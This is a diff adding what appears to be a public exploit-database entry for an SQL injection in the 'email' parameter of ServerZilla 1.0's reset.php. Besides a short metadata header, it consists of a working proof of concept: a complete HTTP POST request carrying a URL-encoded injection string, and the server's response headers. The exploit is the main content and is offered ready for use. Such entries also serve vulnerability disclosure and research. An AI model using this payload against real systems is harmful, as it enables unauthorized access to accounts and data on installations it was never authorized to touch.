@@ -1,0 +1,33 @@
+# Exploit Title: ServerZilla 1.0 - 'email' SQL Injection
+# Dork: N/A
+# Date: 2018-11-08
+# Exploit Author: Ihsan Sencan
+# Vendor Homepage: https://serverzilla.sourceforge.io/
+# Software Link: https://ayera.dl.sourceforge.net/project/serverzilla/ServerZilla_src.zip
+# Version: 1.0 
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: N/A
+
+# POC: 
+# 1)
+# http://localhost/[PATH]/reset.php
+# 
+POST /[PATH]/reset.php HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+email=%27%20%4f%52%20%4e%4f%54%20%31%3d%31%2d%2d%20%45%66%65&code=
+HTTP/1.1 200 OK
+Date: Thu, 08 Nov 2018 19:57:09 GMT
+Server: Apache/2.4.25 (Win32) OpenSSL/1.0.2j PHP/5.6.30
+X-Powered-By: PHP/5.6.30
+Content-Length: 1117
+Keep-Alive: timeout=5, max=100
+Connection: Keep-Alive
+Content-Type: text/html; charset=UTF-8
